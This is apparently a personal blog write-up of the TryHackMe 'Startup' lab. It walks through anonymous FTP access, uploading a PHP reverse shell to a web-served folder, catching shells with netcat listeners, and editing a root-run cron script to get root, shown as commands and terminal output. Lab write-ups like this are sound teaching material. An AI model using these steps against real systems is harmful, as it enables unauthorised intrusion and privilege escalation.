---
title: Startup Writeup
published: 2026-03-22
description: Writeup of an easy room by TryHackMe.
tags: [Writeup, Easy, TryHackMe]
category: TryHackMe
draft: false
---

### Hello and welcome back everyone today I will be trying a new tryhackme easy room called Startup.

[Startup](https://tryhackme.com/room/startup)

### Let's start with a nmap scan.
```
┌──(igris㉿kali)-[~/Desktop/spice]
└─$ nmap -sV spice.thm    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-14 00:00 EDT
Nmap scan report for spice.thm (10.201.119.148)
Host is up (0.26s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.42 seconds
```
### ftp, ssh and http are open so let's try to login to ftp as anonymous.
### Just as i guessed anonymous login is possible and i searched ftp. This is everything i did i downloaded the files to my machine for further looking at it.
```
┌──(igris㉿kali)-[~/Desktop/spice]
└─$ ftp spice.thm 
Connected to spice.thm.
220 (vsFTPd 3.0.3)
Name (spice.thm:igris): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||28074|)
150 Here comes the directory listing.
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 .
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 ..
-rw-r--r--    1 0        0               5 Nov 12  2020 .test.log
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
226 Directory send OK.
ftp> mget *
mget ftp [anpqy?]? 
229 Entering Extended Passive Mode (|||7144|)
550 Failed to open file.
mget important.jpg [anpqy?]? 
229 Entering Extended Passive Mode (|||58179|)
150 Opening BINARY mode data connection for important.jpg (251631 bytes).
100% |****************************************************************************************************|   245 KiB  242.48 KiB/s    00:00 ETA
226 Transfer complete.
251631 bytes received in 00:01 (195.88 KiB/s)
mget notice.txt [anpqy?]? 
229 Entering Extended Passive Mode (|||28203|)
150 Opening BINARY mode data connection for notice.txt (208 bytes).
100% |****************************************************************************************************|   208      182.99 KiB/s    00:00 ETA
226 Transfer complete.
208 bytes received in 00:00 (0.82 KiB/s)
ftp> mget .test.log
mget .test.log [anpqy?]? 
229 Entering Extended Passive Mode (|||64265|)
150 Opening BINARY mode data connection for .test.log (5 bytes).
100% |****************************************************************************************************|     5        3.16 KiB/s    00:00 ETA
226 Transfer complete.
5 bytes received in 00:00 (0.01 KiB/s)
ftp> cd ftp
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||48498|)
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 .
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 ..
226 Directory send OK.
```
### Well i couldnt find anything interesting.
```
┌──(igris㉿kali)-[~/Desktop/spice]
└─$ ls -la
total 264
drwxrwxr-x  2 igris igris   4096 Oct 14 00:04 .
drwxr-xr-x 33 igris igris   4096 Oct 13 23:59 ..
-rw-rw-r--  1 igris igris 251631 Nov 11  2020 important.jpg
-rw-rw-r--  1 igris igris    208 Nov 11  2020 notice.txt
-rw-rw-r--  1 igris igris      5 Nov 11  2020 .test.log
                                                                                                                                                 
┌──(igris㉿kali)-[~/Desktop/spice]
└─$ cat notice.txt 
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
                                                                                                                                                 
┌──(igris㉿kali)-[~/Desktop/spice]
└─$ cat .test.log 
test
```
### And this is the jpg file.
<img width="735" height="458" alt="image" src="https://github.com/user-attachments/assets/fe4998d2-013e-4682-95e1-d0ef3bcede44" />

### Now let's look at the website.
<img width="1570" height="1192" alt="image" src="https://github.com/user-attachments/assets/0ebf0ec2-9fe1-4c08-ba43-aa14f03125b0" />

### It's just a work in progress site and nothing interesting. Let's run gobuster now.
### While gobuster was running i tried to enumerate the jpg image but didnt find anything.

### Gobuster found a directory named files so let's check that out. It's just the ftp directory.
<img width="1308" height="750" alt="image" src="https://github.com/user-attachments/assets/b29bd4e0-a588-42c4-8154-b66336de8682" />

### And now i got a idea what if i put a reverse shell through the ftp and open it in http. then i could get a shell. This seems good so lets try that out.
### I downloaded the famous php reverse shell by pentestmonkey and tried putting it in ftp.
```
┌──(igris㉿kali)-[~/Desktop/spice]
└─$ ftp spice.thm                                                         
Connected to spice.thm.
220 (vsFTPd 3.0.3)
Name (spice.thm:igris): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> put shell.php
local: shell.php remote: shell.php
229 Entering Extended Passive Mode (|||41255|)
553 Could not create file.
ftp> cd ftp
250 Directory successfully changed.
ftp> put shell.php
local: shell.php remote: shell.php
229 Entering Extended Passive Mode (|||16390|)
150 Ok to send data.
100% |****************************************************************************************************|  5494       28.16 MiB/s    00:00 ETA
226 Transfer complete.
5494 bytes sent in 00:00 (10.75 KiB/s)
ftp> 
```

### I couldnt put it in the files folder but could in ftp so yessss it worked. Now i started a listener and got hit the shell.php with curl.

```
┌──(igris㉿kali)-[~/Desktop/spice]
└─$ nc -lnvp 4444         
listening on [any] 4444 ...
connect to [10.17.58.191] from (UNKNOWN) [10.201.119.148] 39142
Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 04:17:57 up 20 min,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
```
### And we got the shell as www-data.
### I found a text file named recipe.txt and it contained the answer to the 1st question.
### Now we need to find a way to get shell as lennie the user on the box.
### I always see this linpeas on everyones writeup's but havent tried it myself yet so i think it's time to give it a try.


### First i downloaded the linpeas script and put it in the /tmp folder of the target machine. And executed linpeas.

### With that i found a incidents folder and looking inside it there was a .pcapng file so i downloaded it and looked through wireshark.
### Looking at the file i found that someone else had also gotten a reverse shell and lennie's password was there. And i logged in as lennie.

### And i got the user flag. Now need to escalate to root.

### I tried sudo -l but lennie couldnt run anything on the box.

### I tried another software called lspy64 to search for active processes on the machine and found a process 
```
2025/10/14 06:00:01 CMD: UID=0     PID=31244  | /bin/bash /home/lennie/scripts/planner.sh 
2025/10/14 06:00:01 CMD: UID=0     PID=31243  | /bin/sh -c /home/lennie/scripts/planner.sh
```
### looking at the file we can see that another file named print.sh is also beeing executed which we can edit.
```
lennie@startup:~/scripts$ cat planner.sh
cat planner.sh
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```
### So let's edit the print.sh file to contain our reverse shell and start a listener and hope to get the shell as root.
```
┌──(igris㉿kali)-[~/Desktop/spice]
└─$ nc -lnvp 5555         
listening on [any] 5555 ...
connect to [10.17.58.191] from (UNKNOWN) [10.201.119.148] 41940
bash: cannot set terminal process group (31291): Inappropriate ioctl for device
bash: no job control in this shell
root@startup:~# 
```
### And we are in as root. Let's read the root flag and another machine is completed.....